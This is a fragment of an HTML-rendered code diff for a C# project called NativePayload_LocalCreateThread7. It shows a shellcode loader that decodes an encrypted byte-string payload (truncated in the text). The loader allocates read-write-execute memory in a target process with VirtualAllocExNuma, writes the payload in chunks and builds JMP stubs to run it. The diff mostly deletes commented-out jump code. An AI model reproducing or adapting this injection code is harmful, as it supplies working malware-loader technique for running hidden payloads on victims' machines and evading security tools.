@@ -1428,11 +1428,7 @@ namespace NativePayload_LocalCreateThread7
             new System.Threading.Thread(() =&gt;
             {
 
-                /// Write some asm code to the allocated memory that jumps to the specified return address
-                ////byte[] asmCode = new byte[] { 0xE9, 0x00, 0x00, 0x00, 0x00 }; // JMP &lt;relative_address&gt;
-                ////BitConverter.GetBytes((uint)AddressOfPayload_In_Mem - ((uint)addr + 5)).CopyTo(asmCode, 1);
-                /// Write some asm code to the allocated memory that jumps to the specified return address
-
+              
                 string Payload_Encrypted = &quot;236 88 147 244 224 248 220 16 16 16 81 65 81 64 66 88 33 194 ...&quot;;</font></b></pre>
 				<pre><b><font face="Tahoma">                string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(&#39; &#39;);
                 byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
@@ -1518,8 +1514,7 @@ namespace NativePayload_LocalCreateThread7
                 foreach (byte[] item in all_chunks)
                 {                 
                     AddressOfPayload_In_MemX = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)item.Length, 0x1000, 0x40, 0);
-                    //byte[] asmCode = new byte[] { 0xE9, 0x00, 0x00, 0x00, 0x00 }; // JMP &lt;relative_address&gt;
-                    //BitConverter.GetBytes((uint)AddressOfPayload_In_Mem - ((uint)AddressOfPayload_In_MemX + 5)).CopyTo(asmCode, 1);
+                   
                     
                     byte[] _jmpBytes_run = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
                     byte[] _addressBytes0_run = BitConverter.GetBytes((int)AddressOfPayload_In_MemX + (uint)128);
